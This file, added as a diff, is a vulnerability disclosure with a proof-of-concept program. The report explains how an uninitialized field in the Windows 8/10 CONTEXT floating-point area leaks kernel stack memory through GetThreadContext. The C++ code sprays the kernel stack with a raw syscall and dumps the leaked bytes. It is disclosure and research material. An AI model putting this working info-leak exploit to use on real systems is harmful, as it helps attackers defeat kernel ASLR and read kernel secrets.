@@ -1,0 +1,199 @@
+/*
+We have discovered a new Windows kernel memory disclosure vulnerability in the creation and copying of a CONTEXT structure to user-mode memory. Two previous bugs in the nearby code area were reported in issues  #1177  and  #1311 ; in fact, the problem discussed here appears to be a variant of #1177 but with a different trigger (a GetThreadContext() call instead of a generated exception).
+
+The leak was originally detected under the following stack trace:
+
+--- cut ---
+  kd> k
+   # ChildEBP RetAddr  
+  00 a5d2b8f4 81ec3e30 nt!RtlpCopyLegacyContextX86+0x16e
+  01 a5d2b91c 82218aec nt!RtlpCopyExtendedContext+0x70
+  02 a5d2b96c 8213a22a nt!RtlpWriteExtendedContext+0x66
+  03 a5d2bd18 822176bc nt!PspGetContextThreadInternal+0x1c6
+  04 a5d2bd44 81fccca7 nt!NtGetContextThread+0x54
+  05 a5d2bd44 77a41670 nt!KiSystemServicePostCall
+--- cut ---
+
+and more specifically in the copying of the _FLOATING_SAVE_AREA structure when the CONTEXT_FLOATING_POINT flags are set:
+
+--- cut ---
+  kd> dt _FLOATING_SAVE_AREA
+  ntdll!_FLOATING_SAVE_AREA
+     +0x000 ControlWord      : Uint4B
+     +0x004 StatusWord       : Uint4B
+     +0x008 TagWord          : Uint4B
+     +0x00c ErrorOffset      : Uint4B
+     +0x010 ErrorSelector    : Uint4B
+     +0x014 DataOffset       : Uint4B
+     +0x018 DataSelector     : Uint4B
+     +0x01c RegisterArea     : [80] UChar
+     +0x06c Spare0           : Uint4B
+--- cut ---
+
+In that structure, the last 32-bit "Spare0" field is left uninitialized and provided this way to the ring-3 client. The overall CONTEXT structure (which contains the FLOATING_SAVE_AREA) is allocated from the stack with an alloca() call in the nt!PspGetContextThreadInternal function:
+
+--- cut ---
+  PAGE:006BA173                 lea     edx, [ebp+var_48]
+  PAGE:006BA176                 mov     ecx, [ebp+ContextFlags]
+  PAGE:006BA179                 call    RtlGetExtendedContextLength(x,x)
+  PAGE:006BA17E                 test    eax, eax
+  PAGE:006BA180                 js      short loc_6BA140
+  PAGE:006BA182                 mov     eax, [ebp+var_48]
+  PAGE:006BA185                 call    __alloca_probe_16 <============================
+  PAGE:006BA18A                 mov     [ebp+ms_exc.old_esp], esp
+  PAGE:006BA18D                 mov     ecx, esp
+  PAGE:006BA18F                 mov     [ebp+var_54], ecx
+  PAGE:006BA192                 lea     eax, [ebp+var_4C]
+  PAGE:006BA195                 push    eax
+  PAGE:006BA196                 mov     edx, [ebp+ContextFlags]
+  PAGE:006BA199                 call    RtlInitializeExtendedContext(x,x,x)
+--- cut ---
+
+The "Spare0" field is not pre-initialized or written to by any of the routines that fill out the FLOATING_SAVE_AREA structure. As a result, running the attached proof-of-concept program (designed for Windows 10 32-bit version 1709) reveals 4 bytes of kernel stack memory at offset 0x88 of the output region (set to the 0x41 marker with stack-spraying to illustrate the problem). An example output is as follows:
+
+--- cut ---
+  00000000: 08 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 7f 02 00 00 ................
+  00000020: 00 00 00 00 ff ff 00 00 00 00 00 00 00 00 00 00 ................
+  00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000080: 00 00 00 00 00 00 00 00 41 41 41 41 00 00 00 00 ........AAAA....
+  00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000000a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000000b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000000c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000000d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000000e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000000f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000110: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000120: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000130: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000140: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000150: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000160: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000001a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000001b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000001c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000001d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000001e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000001f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000210: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000220: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000230: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000240: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000250: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000260: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000270: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000290: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000002a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000002b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  000002c0: 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ................
+--- cut ---
+
+Offset 0x88 of the CONTEXT structure on x86 builds indeed corresponds to the 32-bit CONTEXT.FloatSave.Spare0 field. What's most interesting, however, is that the bug only exists on Windows 8 and 10; on Windows 7, we can see that the region obtained through alloca() is instantly zeroed-out with a memset() call:
+
+--- cut ---
+  PAGE:0065EE86                 call    RtlGetExtendedContextLength(x,x)
+  PAGE:0065EE8B                 cmp     eax, ebx
+  PAGE:0065EE8D                 jl      loc_65EFDE
+  PAGE:0065EE93                 mov     eax, [ebp+var_2C]
+  PAGE:0065EE96                 call    __alloca_probe_16
+  PAGE:0065EE9B                 mov     [ebp+ms_exc.old_esp], esp
+  PAGE:0065EE9E                 mov     [ebp+var_3C], esp
+  PAGE:0065EEA1                 push    [ebp+var_2C]    ; size_t
+  PAGE:0065EEA4                 push    ebx             ; int
+  PAGE:0065EEA5                 push    [ebp+var_3C]    ; void *
+  PAGE:0065EEA8                 call    _memset
+--- cut ---
+
+The function call is missing from Windows 8 and later systems, but we are not sure why this regression was introduced.
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+// For native 32-bit execution.
+extern "C"
+ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
+  __asm {mov eax, ApiNumber};
+  __asm {lea edx, ApiNumber + 4};
+  __asm {int 0x2e};
+}
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  // Windows 10 32-bit version 1709.
+  CONST ULONG __NR_NtGdiEngCreatePalette = 0x1296;
+
+  // Buffer allocated in static program memory, hence doesn't touch the local stack.
+  static BYTE buffer[1024];
+
+  // Fill the buffer with 'A's and spray the kernel stack.
+  MyMemset(buffer, 'A', sizeof(buffer));
+  SystemCall32(__NR_NtGdiEngCreatePalette, 1, sizeof(buffer) / sizeof(DWORD), buffer, 0, 0, 0);
+
+  // Make sure that we're really not touching any user-mode stack by overwriting the buffer with 'B's.
+  MyMemset(buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  // Initialize the thread as GUI.
+  LoadLibrary(L"user32.dll");
+
+  CONTEXT ctx;
+  RtlZeroMemory(&ctx, sizeof(ctx));
+  ctx.ContextFlags = CONTEXT_FLOATING_POINT;
+
+  SprayKernelStack();
+
+  if (!GetThreadContext(GetCurrentThread(), &ctx)) {
+    printf("GetThreadContext failed, %d\n", GetLastError());
+    return 1;
+  }
+
+  PrintHex((PBYTE)&ctx, sizeof(ctx));
+
+  return 0;
+}
